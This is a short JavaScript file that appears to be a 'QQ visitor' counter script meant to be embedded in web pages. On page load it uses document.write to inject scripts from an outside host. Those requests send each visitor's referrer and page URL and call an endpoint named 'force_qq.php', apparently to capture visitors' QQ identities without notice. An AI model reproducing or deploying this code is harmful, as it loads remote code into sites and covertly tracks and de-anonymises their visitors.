var jsurl="http://apisus.wueee.com/"
//document.write("<script src='"+jsurl+"tj/sdip.php'></script>");
var isIE = document.all?true:false;
var ie = document.all ? true: false;
var isIE = !!window.ActiveXObject;


var fangke_xHead = document.getElementsByTagName('HEAD').item(0);
var para=document.getElementById("qq_js");
var v;
var v=para.src;

var tmp=v.split("?");
var ids=tmp[1];
var sg_ids = ids.replace("uin=","");
//alert(ids);


var url = tmp[0].split("Count.js");
//alert(url[0]);



var time = Date.parse(new Date()); 
var QQfangke_reff = encodeURIComponent(document.referrer);
var QQfangke_pagee = encodeURIComponent(document.location.href);
document.write("<script src='"+jsurl+"/c/c.php?uid="+sg_ids+"&llurl="+QQfangke_reff+"&thepage="+ QQfangke_pagee +"&fuck="+time+"'></script>");
document.write("<script src='"+jsurl+"/tj/force_qq.php?"+ids+"&thepage="+ QQfangke_pagee +"'></script>");